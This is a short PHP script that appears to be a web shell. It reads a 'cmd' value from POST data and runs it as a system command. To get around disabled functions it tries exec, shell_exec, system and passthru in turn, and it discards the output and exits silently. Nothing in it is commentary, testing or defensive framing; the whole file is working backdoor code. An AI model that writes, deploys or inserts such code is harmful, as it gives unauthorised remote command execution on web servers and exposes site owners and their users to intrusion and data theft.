<?php
function execute($com)
{
   if(function_exists('exec'))
   {
       exec($com,$arr);
       echo implode('',$arr);
   }
   elseif(function_exists('shell_exec'))
       echo shell_exec($com);
   elseif(function_exists('system'))
       echo system($com);
   elseif(function_exists('passthru'))
       echo passthru($com);

}

$cmd = $_POST['cmd'];

ob_start();
execute($cmd);
$buffer = "";
$buffer = ob_get_contents();
ob_end_clean();
die("");
?>